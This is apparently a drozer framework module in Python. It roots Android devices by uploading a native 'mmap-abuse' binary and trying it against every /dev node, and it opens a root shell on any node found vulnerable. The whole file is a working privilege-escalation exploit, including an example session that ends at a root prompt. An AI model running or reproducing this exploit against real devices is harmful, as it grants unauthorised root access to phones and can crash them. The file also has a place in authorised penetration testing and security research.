import os
from drozer.modules import common, Module

class mmap_abuse(Module, common.Vulnerability, common.Shell, common.FileSystem, common.ClassLoader):

    name = "Iterate through all devices and attempt to exploit them to gain a root shell by abusing the mmap device operation."
    description = """Iterate through all devices and attempt to exploit them to gain a root shell by abusing the mmap device operation.

The exploit used by this module has been modified from the original posted by alephzain here: http://forum.xda-developers.com/showthread.php?p=35469999

!WARNING: This module could crash the device! If you know the vulnerable device path, rather specify it directly using --device
"""
    examples = """dz> run exploit.root.mmap_abuse 
[*] Uploading mmap-abuse
[*] Upload successful
[*] chmod 770 mmap-abuse
[*] Testing /dev/btlock
[*] Testing /dev/icdr
[*] Testing /dev/icd
<...snipped...>
[*] Testing /dev/exynos-mem
[+] /dev/exynos-mem is vulnerable!
[+] Enjoy your root shell...
app_129@android:/data/data/com.mwr.dz #
    """

    author = ["Tyrone (@mwrlabs)", "alephzain (xdadevelopers)"]
    date = "2013-12-12"
    license = "BSD (3 clause)"
    path = ["exploit", "root"]
    
    def add_arguments(self, parser):
        parser.add_argument("--device", help="path of the device to exploit directly")

    def isVulnerable(self, arguments):
        
        # Always return "Possibly Vulnerable" - not sure how to improve this
        return 2

    def exploit(self, arguments):

        # Get private data dir
        directory = str(self.klass('java.lang.System').getProperty("user.dir"))
        if "DATA" not in directory.upper():
            directory = "/data/data/com.mwr.dz"
        
        # Remove if it is there
        self.shellExec("rm " + directory + "/mmap-abuse")
        
        # Upload the exploit
        self.stdout.write("[*] Uploading mmap-abuse\n")
        length = self.uploadFile(os.path.join(os.path.dirname(__file__), "mmap-abuse", "libs", "armeabi", "mmap-abuse"), directory + "/mmap-abuse")

        if length != None:
            self.stdout.write("[*] Upload successful\n")
            self.stdout.write("[*] chmod 770 mmap-abuse\n")
            self.shellExec("chmod 770 " + directory + "/mmap-abuse")

            if arguments.device:
                self.shellStart(directory + "/mmap-abuse " + arguments.device)
                return

            # Iterate through all devices
            for device in self.listFiles("/dev/"):
                device = "/dev/" + str(device)
                print "[*] Testing " + device
                status = self.shellExec(directory + "/mmap-abuse " + device + " --test")
                if "Vulnerable" in status:
                    print "[+] " + device + " is vulnerable!"
                    print "[+] Enjoy your root shell..."
                    self.shellStart(directory + "/mmap-abuse " + device)      
                    return 
            print "[-] No easy root shells here...\n"             
        else:
            self.stderr.write("[-] Could not upload file\n")
